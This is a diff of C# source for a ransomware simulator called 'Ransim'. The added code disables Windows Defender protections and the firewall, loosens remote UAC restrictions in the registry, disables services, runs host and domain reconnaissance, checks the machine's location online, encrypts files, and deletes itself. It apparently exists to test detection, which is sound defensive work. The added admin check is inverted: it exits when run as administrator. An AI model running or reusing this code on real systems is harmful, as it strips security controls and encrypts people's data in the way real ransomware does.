@@ -2,8 +2,8 @@
 # Title:        Ransim
 # Author:       d4rk-d4nph3
 # Description:  Ransomware Simulator
-# Version:      0.1
-# Released at:  2020/07/05
+# Version:      0.2 (Dev)
+# Released at:  xxxx/xx/xx
 ########################################################################################*/
 
 using System;
@@ -12,11 +12,17 @@ using System.IO;
 using System.Net;
 using System.Runtime.InteropServices;
 using System.Security.Cryptography;
+using System.Security.Principal;
 
 namespace Ransim
 {
     class Program
     {
+        public static bool IsAdministrator()
+        {
+            return (new WindowsPrincipal(WindowsIdentity.GetCurrent()))
+                      .IsInRole(WindowsBuiltInRole.Administrator);
+        }
         public static byte[] GenerateRandomSalt()
         {
             byte[] data = new byte[32];
@@ -89,19 +95,74 @@ namespace Ransim
             }
         }
 
-        [DllImport("KERNEL32.DLL", SetLastError = true)]
-        private static extern IntPtr LoadLibrary(string path);
-
-        static string C2Download(string targetDirPath)
+        static void ManipulateRegistry()
         {
-            WebClient client = new WebClient();
-            const string c2_url = "https://github.com/d4rk-d4nph3/test/raw/master/cat.jpg";
-            string output = targetDirPath + @"\cat.jpg";
-            client.Headers.Add("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)");
-            client.DownloadFile(c2_url, output);
-            return output;
+            // Enable Long Paths to avoid issues that may occur when encrypting files with long path names
+            Process.Start("cmd.exe", @"/c REG ADD HKLM\SYSTEM\CurrentControlSet\Control\FileSystem /v LongPathsEnabled /t REG_DWORD /d 1 /f");
+
+            // Disable UAC remote restrictions
+            // See: 
+            // 1. https://docs.microsoft.com/en-us/troubleshoot/windows-server/windows-security/user-account-control-and-remote-restriction
+            // 2. https://posts.specterops.io/pass-the-hash-is-dead-long-live-localaccounttokenfilterpolicy-506c25a7c167
+            Process.Start("cmd.exe", @"/c reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f");
+
+            // Disable EnableLinkedConnections to force the symbolic links to be written to both linked logon sessions
+            // This is useful because when drive mappings are created, the system creates symbolic link objects (DosDevices) that associate the drive letters to the UNC paths 
+            // These objects are specific for a logon session and are not shared between logon sessions
+            Process.Start("cmd.exe", @"/c reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System / v EnableLinkedConnections / t REG_DWORD / d 1 / f");
         }
 
+        static void StopServices()
+        {
+            Process.Start(@"C:\Windows\System32\sc.exe", "config SQLTELEMETRY start=disabled");
+            Process.Start(@"C:\Windows\System32\sc.exe", "config SQLTELEMETRY$ECWDB2 start=disabled");
+            Process.Start(@"C:\Windows\System32\sc.exe", "config SQLWriter start=disabled");
+            Process.Start(@"C:\Windows\System32\sc.exe", "config SstpSvc start=disabled");
+            Process.Start(@"C:\Windows\System32\sc.exe", "config MBAMService start=disabled");
+            Process.Start(@"C:\Windows\System32\sc.exe", "config wuauserv start=disabled");
+        }
+        
+        static void DisableFirewall()
+        {
+            Process.Start(@"C:\Windows\System32\netsh.exe", "advfirewall set allprofiles state off");
+        }
+        static void DisableAV()
+        {
+            // Disable Defender's Real-Time Monitoring
+            Process.Start("powershell.exe", "-command Set-MpPreference -DisableRealtimeMonitoring 1");
+            // Disable Defender's Controlled Folder Access
+            Process.Start("powershell.exe", "-command Set-MpPreference -EnableControlledFolderAccess Disabled");
+        }
+
+        static void RunRecon()
+        {
+            // Runs a barrage of reconnaissance commands
+            Process.Start("systeminfo.exe");
+            Process.Start("whoami.exe", "/all");
+            Process.Start("ipconfig.exe", "/all");
+            Process.Start("route.exe", "print");
+            Process.Start("net.exe", "user");
+            Process.Start("arp.exe", "-a");
+            Process.Start("net.exe", "share");
+            Process.Start("net.exe", "view /all");
+            Process.Start("net.exe", "view /all /domain");
+            Process.Start("net.exe", "localgroup");
+            Process.Start("net.exe", "config workstation");
+            Process.Start("netstat.exe", "-ano");
+
+            // Query installed AV
+            Process.Start("wmic.exe", @"/Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List");
+
+            // Query VMs on the system
+            Process.Start("powershell.exe", "-command Get-VM");
+
+            // AD Domain recon
+            Process.Start("nltest.exe", "/domain_trusts");
+            Process.Start("nltest.exe", "/domain_trusts /all_trusts");
+            Process.Start("net.exe", "group 'Domain Admins' /domain");
+
+            
+        }
         static void RansomNoteDownload(string ransomNote)
         {
             WebClient client = new WebClient();
@@ -111,18 +172,51 @@ namespace Ransim
             client.DownloadFile(pastebin_url, ransomNote);
         }
 
+        static void LocationCheck()
+        {
+            string responseJSON = string.Empty;
+            string url = @"https://ipinfo.io/json";
+
+            HttpWebRequest request = (HttpWebRequest)WebRequest.Create(url);
+            request.AutomaticDecompression = DecompressionMethods.GZip;
+
+            using (HttpWebResponse response = (HttpWebResponse)request.GetResponse())
+            using (Stream stream = response.GetResponseStream())
+            using (StreamReader reader = new StreamReader(stream))
+            {
+                responseJSON = reader.ReadToEnd();
+            }
+
+            Console.WriteLine(responseJSON);
+        }
+
+        static void SelfDelete()
+        {
+            // Delete itself
+            string exePath = System.Reflection.Assembly.GetExecutingAssembly().Location;
+            Process.Start("cmd.exe", "/c ping 1.1.1.1 -n 5 > Nul & Del " + exePath + " /F /Q");
+        }
+
         static void Main(string[] args)
         {
             const string targetDir = "Reports";
             const string ransomNote = "ransom_note.txt";
             const string tempDir = "11";
             const string randomPassword = "12345";
-            const string newFilename = "crypt0.dll";
             string userDirPath = Environment.GetEnvironmentVariable("USERPROFILE");
             string targetDirPath = userDirPath + @"\" + targetDir;
             string[] files = Directory.GetFiles(targetDirPath, "*");
 
             string tempDirPath = userDirPath + @"\" + tempDir;
+
+            // Check if Ransim was ran as Admin
+            if (IsAdministrator() == true)
+            {
+                Console.WriteLine("Please run Ransim as administrator!");
+                Console.WriteLine("Exiting...");
+                return;
+            }
+
             if (!Directory.Exists(targetDirPath))
             {
                 // Precaution
@@ -131,25 +225,19 @@ namespace Ransim
                 return;
             }
 
-            Console.WriteLine("Creating temporary directory");
-            Directory.CreateDirectory(tempDirPath);
+            //Run Location Check
+            LocationCheck();
 
-            Console.WriteLine("Downloading Payload DLL");
-            string downFile = C2Download(tempDirPath);
+            RunRecon();
 
-            // Rename downloaded file.
-            File.Move(downFile, tempDirPath + @"\" + newFilename);
-            try
-            {
-                // Simulating importing of DLL.
-                IntPtr hModule = LoadLibrary(tempDirPath + @"\" + newFilename);
-                Console.WriteLine("DLL loading successful");
-            }
-            catch
-            {
-                Console.WriteLine("Exception Occured during DLL loading.");
+            DisableAV();
 
-            }
+            DisableFirewall();
+
+            // Runs a barrage of Registry manipulations commands
+            ManipulateRegistry();
+           
+            StopServices();
 
             Console.WriteLine("Starting encryption process");
             // Iterate over files in the target directory for encryption.
@@ -167,6 +255,9 @@ namespace Ransim
             Process.Start("notepad.exe", ransomNote);
 
             Console.WriteLine("Time for you to check your logs.");
+            
+            // Initiate Self Delete Procedure
+            SelfDelete();
         }
     }
 }
